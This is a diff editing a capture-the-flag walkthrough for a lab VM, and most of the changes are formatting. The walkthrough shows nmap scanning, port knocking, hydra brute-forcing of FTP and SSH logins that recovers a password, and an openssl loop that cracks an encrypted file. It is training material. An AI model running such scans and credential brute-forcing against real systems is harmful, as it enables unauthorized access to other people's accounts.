@@ -22,8 +22,7 @@ Let's kick this off with a `nmap` scan to establish the services available in **
 
 ```
 # nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.198.128
-```
-```
+...
 PORT    STATE  SERVICE REASON         VERSION
 21/tcp  open   ftp     syn-ack ttl 64 ProFTPD 1.3.5b
 22/tcp  open   ssh     syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
@@ -82,7 +81,7 @@ Decoding the above strings revealed the following.
 ```
 # curl -s 192.168.198.128 | sed -n '/<!--/,/-->/p' | tr -cd 'a-zA-Z0-9=\n' > base64.txt
 ```
-```bash
+```
 # for b in $(cat base64.txt); do (echo $b | base64 -d && echo); done
 nice try!
 nothing to see here!
@@ -94,9 +93,7 @@ work-in-progress.png
 Requesting for `/secretfile.html` further revealed more binary strings.
 
 ```
-# curl -i 192.168.198.128/secretfile.html
-```
-```
+curl -i 192.168.198.128/secretfile.html
 HTTP/1.1 200 OK
 Date: Mon, 22 Jan 2018 15:09:17 GMT
 Server: Apache/2.4.25 (Debian)
@@ -124,8 +121,8 @@ Content-Type: text/html
 
 The binary strings were decoded to the following.
 
-```bash
-# for b in 01100010 01101111 01110011 01110011 00101110 01100111 01101001 01100110; do printf "%02x" $((2#$b)); done | xxd -p -r && echo
+```
+for b in 01100010 01101111 01110011 01110011 00101110 01100111 01101001 01100110; do printf "%02x" $((2#$b)); done | xxd -p -r && echo
 boss.gif
 ```
 `¯\_(ツ)_/¯`
@@ -136,8 +133,6 @@ Requesting for `/work-in-progress.png` resulted in the following.
 
 ```
 # curl -i 192.168.198.128/work-in-progress.png
-```
-```
 HTTP/1.1 200 OK
 Date: Mon, 22 Jan 2018 15:11:43 GMT
 Server: Apache/2.4.25 (Debian)
@@ -265,7 +260,7 @@ I wrote this port knocking script using `nmap`.
 
 ```bash
 # cat knock.sh
-#!/bin/sh
+#!/bin/bash
 
 TARGET=$1
 
@@ -282,9 +277,7 @@ done
 `sequence.txt` contained all the unique sequences of 1955, 1955, 1961 and 1970 and it can be generated like so.
 
 ```bash
-# python -c 'import itertools; print list(itertools.permutations([1955,1955,1961,1970]))' | sed 's/), /\n/g' | tr -cd '0-9,\n' | sort | uniq
-```
-```
+python -c 'import itertools; print list(itertools.permutations([1955,1955,1961,1970]))' | sed 's/), /\n/g' | tr -cd '0-9,\n' | sort | uniq
 1955,1955,1961,1970
 1955,1955,1970,1961
 1955,1961,1955,1970
@@ -340,8 +333,6 @@ Requesting for `http://192.168.198.128:61955/H` revealed something interesting.
 
 ```
 # curl 192.168.198.128:61955/H
-```
-```
 ++++++++++[>+++++++>++++++++++>+++>+<<<<-]>++.>+.+++++++..+++.>++.<<+++++++++++++++.>.+++.------.--------.>+.>.
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
@@ -385,8 +376,7 @@ OK. I have the team members' names and a password but to whom does the password 
 ```
 # hydra -L members.txt -p bakeoff -f ftp://192.168.198.128
 [21][ftp] host: 192.168.198.128 login: mary password: bakeoff
-```
-```
+
 # hydra -L members.txt -p bakeoff -f ssh://192.168.198.128
 [22][ssh] host: 192.168.198.128 login: mary password: bakeoff
 ```
@@ -431,12 +421,12 @@ FILE=.reminder.enc
 
 for c in $(cat ciphers.txt); do
     for pw in $(sed -n 3,12p .trash); do
-        openssl enc $c -d -salt -in $FILE -pass pass:$pw -out /dev/null &>/dev/null
+       openssl enc $c -d -salt -in $FILE -pass pass:$pw -out /dev/null &>/dev/null
         if [ $? -eq 0 ]; then
             dec=$(openssl enc $c -d -salt -in $FILE -pass pass:$pw | tr -cd '[:print:]')
             if [ $? -eq 0 ]; then
                 echo "[*] Trying $c with $pw"
-                printf "%s\n" $dec
+                printf "%s\n\n" "$dec"
                 break
             fi
         fi
@@ -567,7 +557,7 @@ The first word must contain the following:
 
 I used the following command to find the first word by eliminating the characters that should not appear and it must be a word in a dictionary.
 
-```bash
+```
 # for word in $(grep -E '^che' /usr/share/dict/words | tr -cd 'chebmw\n' | sort | uniq | tr '\n' ' '); do grep -Eo "^$word$" /usr/share/dict/words; done
 chew
 ```
@@ -582,7 +572,7 @@ The last word must contain the following:
 
 Similarly, finding the last word that meets the above constraints.
 
-```bash
+```
 # for word in $(grep -E 'rry$' /usr/share/dict/words | tr -cd 'bemrry\n' | sort | uniq | tr '\n' ' '); do grep -Eo "^$word$" /usr/share/dict/words; done
 berry
 merry
